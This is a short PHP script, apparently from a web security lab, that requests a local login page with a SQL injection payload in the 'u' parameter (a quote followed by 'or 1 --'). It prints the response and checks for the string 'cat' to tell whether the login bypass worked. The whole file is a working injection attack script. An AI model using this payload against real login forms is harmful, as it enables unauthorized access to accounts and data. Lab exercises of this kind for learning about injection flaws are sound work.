<?php
$url="http://localhost/lab09/login.php?u=\" or 1 -- ";
$result = file_get_contents($url);

print($result);

if (strpos($result, 'cat') !== false) {
	echo "\n";
	echo 'true';
}else{
	echo "\n";
	echo "nope";
}

echo "\n";

?>